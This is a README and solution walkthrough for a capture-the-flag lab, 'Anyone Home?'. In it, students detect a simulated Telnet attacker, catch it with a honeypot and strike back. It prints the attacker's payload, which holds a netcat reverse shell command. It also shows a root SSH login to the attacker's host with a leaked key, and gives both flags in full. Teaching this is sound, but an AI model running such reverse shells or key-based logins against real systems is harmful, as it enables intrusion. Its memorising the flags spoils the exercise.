# Anyone Home?

An attacker-controlled container keeps probing hackerlab (telnet ports) and once it gets a shell, and it verifies its authenticity (by running 3 standard commands), it tries to deploy a malicious payload. 

Students must spot the activity, trick the attacker with a honeypot, analyse the dropped payload (1st flag), and finally attack back and pwn the attacker's (2nd flag) server.

### Tasks

1. **Is Anyone Home?** – Capture the malicious payload and extract the embedded flag.
2. **Bonus: Uno Reverse Card** – Exploit the attacker’s sloppy OPSEC, gain access to their box, and recover the bonus flag.

## How to solve
<details>
  <summary>Click to reveal how to solve steps</summary>

1. Start by monitoring inbound traffic on the student machine to confirm something is repeatedly reaching out over Telnet:
   ```bash
   root@hackerlab:~# tcpdump -n -vv -A port 23
   ```
   You should quickly notice connections and commands coming from `172.20.0.46`.

2. Instead of letting the attacker run commands on the real system, implement a honeypot and analyze attacker's actions. See a reference implementation in [auto-solve/telnet-honeypot.py](./auto-solve/telnet-honeypot.py)
   
3. Once you discover that attacker wants to download a payload from `http://172.20.0.46:8080//0ZbPWi0apUuFbpiwN2fp/payload.sh`, fetch the payload directly and inspect it:
   ```bash
   root@hackerlab:~# wget -O payload.sh http://172.20.0.46:8080//0ZbPWi0apUuFbpiwN2fp/payload.sh
   root@hackerlab:~# cat payload.sh
   #!/bin/sh
   # BSY{9YHgu60tUn5RjoYRTyViAMQWrci3y7w9x49w4qXXA3IHvWCb}
   nc -e /bin/sh 172.20.0.46 1234
   ```
   The comment line contains the first flag. Submit it through the dashboard.

4. To complete the bonus task, browse the attacker's staging directory to learn what else they exposed:
   ```bash
   root@hackerlab:~# curl http://172.20.0.46:8080//0ZbPWi0apUuFbpiwN2fp
   Files: 
   /var/www/payloads/payload.sh
   /var/www/payloads/key
   ```
   Download the leaked SSH private key and lock down its permissions:
   ```bash
   root@hackerlab:~# wget -O attacker.key http://172.20.0.46:8080//0ZbPWi0apUuFbpiwN2fp/key
   root@hackerlab:~# chmod 600 attacker.key
   ```

5. Use the key to authenticate to the attacker’s host and read the flag from root’s home:
   ```bash
   root@hackerlab:~# ssh -i attacker.key -o StrictHostKeyChecking=no root@172.20.0.46
   root@172.20.0.46:~# cat /root/.flag.txt
   BSY{cQZ3TSoUVgbiO3EeyZiI5IidU6lcknWhjFRdeJppxV8yRs9M}
   ```
   Submit the second flag to complete the bonus task.

</details>

## Testing

The script [auto-solve.sh](./auto-solve.sh) automatically verifies that the challenge can be solved.
